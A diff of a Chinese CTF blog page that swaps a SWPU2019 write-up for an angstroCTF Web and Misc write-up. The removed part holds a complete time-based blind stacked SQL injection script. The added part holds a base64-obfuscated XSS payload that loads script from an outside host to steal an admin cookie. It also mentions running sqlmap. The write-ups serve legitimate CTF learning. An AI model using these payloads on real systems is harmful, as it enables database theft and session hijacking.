@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>[SWPU2019]Web4(堆叠注入+Thinkphp审计) | 过客</title>	
+<title>angstroCTF Web+Misc | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">[SWPU2019]Web4(堆叠注入+Thinkphp审计)</h1>
+			<h1 class="wow swing entry-title">angstroCTF Web+Misc</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-13 13:18:34" itemprop="datePublished" pubdate="">2020-03-13</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-15 10:51:17" itemprop="datePublished" pubdate="">2020-03-15</time></i>
 	          </div>
 			
 </span>
@@ -161,71 +161,103 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>注册界面关了。只有一个登陆。<br>
-普通的注入并没有啥效果。堆叠注入sleep执行了<br>
-以下是脚本</p>
-<pre><code>import requests
-import time
-from urllib.parse import unquote
-r=requests.session()
-slist='abcdefghijkmnlopqrstvuwxyzABCDEFGHIJKMNLOPQRSTVUWXYZ[](),{}_-1234567890.'
-column=''
-def hexpayload(s):
-    a=''
-    for i in s:
-        a+=hex(ord(i)).replace('0x','')
-    return a
-for a in range(20,60):
-    for b in slist:
-        payload=hexpayload('select if(ascii(substr((select group_concat(flag) from flag),'+str(a)+',1))='+str(ord(b))+',sleep(5),1)')
-        url='http://57708694-cc2c-4516-92f1-0793ad0cd3a8.node3.buuoj.cn/index.php?r=Login/Login'
-        data={&quot;username&quot;:&quot;';set @a=0x&quot;+str(payload)+&quot;;prepare execsql from @a;execute execsql;&quot;,
-              &quot;password&quot;:&quot;123&quot;
-            }
-        t1=time.time()
-        r=requests.post(url=url,json=data)
-        t2=time.time()
-        print(str(a)+column)
-        if t2-t1&gt;5:
-            column+=str(b)
-            break
+				<p>ws1:<br>
+追踪TCP流得到Flag<br>
+<img src="https://guokeya.github.io/post-images/1584240752587.png" alt="" loading="lazy"><br>
+ws2:<br>
+HTTP流。导出JPG得到Flag<br>
+<img src="https://guokeya.github.io/post-images/1584240943390.png" alt="" loading="lazy"><br>
+inputter:<br>
+源码如下</p>
+<pre><code>#define _GNU_SOURCE
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+#define FLAGSIZE 128
+
+void print_flag() {
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+    FILE *file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+    char flag[FLAGSIZE];
+    if (file == NULL) {
+        printf(&quot;Cannot read flag file.\n&quot;);
+        exit(1);
+    }
+    fgets(flag, FLAGSIZE, file);
+    printf(&quot;%s&quot;, flag);
+}
+
+int main(int argc, char* argv[]) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc != 2) {
+        puts(&quot;Your argument count isn't right.&quot;);
+        return 1;
+    }
+    if (strcmp(argv[1], &quot; \n'\&quot;\x07&quot;)) {
+        puts(&quot;Your argument isn't right.&quot;);
+        return 1;
+    }
+    char buf[128];
+    fgets(buf, 128, stdin);
+    if (strcmp(buf, &quot;\x00\x01\x02\x03\n&quot;)) {
+        puts(&quot;Your input isn't right.&quot;);
+        return 1;
+    }
+    puts(&quot;You seem to know what you're doing.&quot;);
+    print_flag();
+}
 </code></pre>
-<p>得到glzjin_wants_a_girl_friend.zip<br>
-是个thinkphp框架。开始审计<br>
-首先看index.php<br>
-<img src="https://guokeya.github.io/post-images/1584080368237.png" alt="" loading="lazy"><br>
-包含了三个文件。第一个是数据库配置文件<br>
-第二个是用来跳转到其他路由的。<br>
-这里可以包含其他文件。<br>
-<img src="https://guokeya.github.io/post-images/1584080539024.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1584080553852.png" alt="" loading="lazy"><br>
-在view/userIndex.php中。我们发现了一个任意文件读取。但是<code>$img_file</code>参数不可控<br>
-<img src="https://guokeya.github.io/post-images/1584080673689.png" alt="" loading="lazy"><br>
-之前可以包含其他文件。我们看下对应的UserController.php<br>
-<img src="https://guokeya.github.io/post-images/1584080797515.png" alt="" loading="lazy"><br>
-利用如下:<br>
-index.php包含func.php用于路由<br>
-访问userControl.php下的index方法。传入r=User/Index<br>
-传入数字img_file。通过loadView方法后。进行变量覆盖。然后include<code>/View/userIndex.php</code>。进行任意文件读取<br>
-base64解码得到flag<br>
-<img src="https://guokeya.github.io/post-images/1584080991790.png" alt="" loading="lazy"></p>
+<p>只要第一个参数为空格换行'&quot;\x07。第二个参数为\x00010203\n<br>
+a.py:</p>
+<pre><code>print &quot; \n'\&quot;\x07&quot;
+</code></pre>
+<p>b.py:</p>
+<pre><code>print &quot;\x00\x01\x02\x03\n&quot;
+</code></pre>
+<pre><code>python b.py|./inpuuter `python a.py`
+</code></pre>
+<p>得到flag</p>
+<p>ws3:<br>
+是一个git-pack的流量。首先wireshark分离出来<br>
+有一个git-receive-pack文件18KB.其他就1KB.<br>
+继续对此文件分离，得到Flag<br>
+<img src="https://guokeya.github.io/post-images/1584241829597.png" alt="" loading="lazy"></p>
+<p>The Magic Word:<br>
+右键查看源码<br>
+<img src="https://guokeya.github.io/post-images/1584241879497.png" alt="" loading="lazy"><br>
+magic的值等于please give flag就能拿到flag。HTML改一下就行<br>
+<img src="https://guokeya.github.io/post-images/1584241931632.png" alt="" loading="lazy"></p>
+<p>Xmas Still Stands:<br>
+XSS。直接给烨师傅的payload</p>
+<pre><code>&lt;img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzeWUuY29tL3lleWV5ZT8nK01hdGgucmFuZG9tKCk='))&gt;
+</code></pre>
+<p>得到管理员cookie后。拿到flag</p>
+<p>Consolation:<br>
+<img src="https://guokeya.github.io/post-images/1584242031985.png" alt="" loading="lazy"></p>
+<p>Git Good:<br>
+githacker下来后git log --reflog<br>
+<img src="https://guokeya.github.io/post-images/1584242219800.png" alt="" loading="lazy"></p>
+<p>Secret Agents:<br>
+题目给出了源码<br>
+毫无过滤就带入sql语句。<br>
+<img src="https://guokeya.github.io/post-images/1584242265678.png" alt="" loading="lazy"><br>
+ua头sqlmap跑以下就行</p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
-				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
-				 
-				<a href="https://guokeya.github.io/tag/Web/" rel="tag">Web安全</a>	
-				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/galW4kTUg/" rel="prev"> angstroCTF Web+Misc</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/t4QExMZtn/" rel="next"> [SUCTF 2018]MultiSQL(sql读取文件+写入文件)</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/MzHF-GZP0/" rel="next"> [SWPU2019]Web4(堆叠注入+Thinkphp审计)</a></div>
 		
 		</div>
 	</nav>
